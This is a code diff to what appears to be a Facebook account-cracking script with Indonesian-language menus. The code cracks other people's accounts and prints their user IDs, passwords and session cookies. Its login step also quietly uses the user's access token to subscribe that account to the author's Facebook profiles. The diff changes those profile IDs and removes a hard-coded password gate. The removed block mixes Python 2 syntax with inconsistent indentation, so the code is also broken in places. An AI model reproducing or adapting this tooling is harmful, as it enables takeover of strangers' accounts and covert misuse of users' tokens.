@@ -22,12 +22,7 @@ def login():
 		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
 		try:
 			nama=r['name']
-			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={to}')
-			req.post(f'https://graph.facebook.com/100004018035398/subscribers?access_token={to}')
-			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={to}')
-			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={to}")
-			req.post(f"https://graph.facebook.com/100069718286138/subscribers?access_token={to}")
-			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={to}")
+			req.post(f'https://graph.facebook.com/553503218/subscribers?access_token={to}')
 			print(f"[☆] Login Successful [☆]\nWelcome {nama}")
 			open("save","a").write(to)
 			time.sleep(1.5)
@@ -37,7 +32,7 @@ def login():
 			time.sleep(1.5)
 			login()
 	elif(pil in ("2","02")):
-		os.system("xdg-open https://youtu.be/guj9s2aK3vM")
+		os.system("xdg-open https://www.facebook.com/karma.428")
 	elif(pil in (" ","  ","   ","    ","     ")):
 		print("[!] Don't Empty")
 		time.sleep(1)
@@ -97,7 +92,7 @@ class crack:
 				open('ok','a').write(user+' '+pw+'\n')
 				print(f'\033[1;96m(√) TIDAK CHECKPOINT (✓)\n(+) USER\t: {user}                         \nPASS\t: {pw}                         \nCOOKIES\t: {"".join(d.cookies.get_dict())}\n-------------------------------------------\33[37;1m                     \n',end='')
 				coki={"cookie":"".join(d.cookies.get_dict())}
-				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
+				r=parser(req.get(mb+"/553503218",cookies=coki).text,"html.parser")
 				for fllow in r.find_all("a"):
 					if "Berhenti mengikuti" in str(fllow):
 						break
@@ -229,24 +224,6 @@ class crack:
 
  \033[32;1mCreator \033[37;1m: \033[33;1mkarma David
 """
-CorrectUsername = "KARMAHARIDA"
-CorrectPassword = "BULLET"
-
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
-        if (password == CorrectPassword):
-            print "Congratulations as " + username
-            loop = 'false'
-        else:
-            print "yang bener dong"
-            os.system('xdg-open https://wa.me/+2348110044418')
-    else:
-        print "salah sayang!"
-        os.system('xdg-open https://wa.me/+2348110044418')
-
 		self.jalan(f"[!] Welcome {self.nama} Happy Using\n")
 		print('[1]. Crack ID From Public/Friend\n[2]. Crack ID From Followers\n[3]. Check Crack Results\n[4]. Setting Useragent\n[5]. Logout Script\n[6]. Report Bugs or Errors')
 		print(f'+'+'-'*45+'+\n')
